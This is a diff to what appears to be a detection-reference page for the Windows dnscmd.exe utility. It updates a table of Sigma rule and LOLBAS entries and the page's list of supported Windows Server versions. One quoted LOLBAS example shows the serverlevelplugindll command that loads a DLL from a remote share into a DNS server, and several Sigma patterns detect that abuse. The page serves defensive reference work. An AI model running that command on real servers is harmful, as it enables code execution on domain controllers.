@@ -155,8 +155,8 @@ C:\Windows\SYSTEM32\ntdll.dll |
 
 Source | Source File | Example | License
 -- | -- | -- | --
+[sigma](https://github.com/Neo23x0/sigma) | [process_creation_dns_serverlevelplugindll.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_dns_serverlevelplugindll.yml) | `Image\|endswith: '\dnscmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2020_1350.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_1350.yml) | `- '\System32\dnscmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_dns_serverlevelplugindll.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_dns_serverlevelplugindll.yml) | `CommandLine: 'dnscmd.exe /config /serverlevelplugindll *'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `Name: Dnscmd.exe`{:.highlight .language-yaml} | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `- Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll`{:.highlight .language-yaml} | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `- Path: C:\Windows\System32\Dnscmd.exe`{:.highlight .language-yaml} | 
@@ -172,7 +172,7 @@ Source | Source File | Example | License
 
 ## Dnscmd
 
-> Applies to: Windows Server (Semi-Annual Channel), Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012
+>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012
 
 A command-line interface for managing DNS servers. This utility is useful in scripting batch files to help automate routine DNS management tasks, or to perform simple unattended setup and configuration of new DNS servers on your network.
 
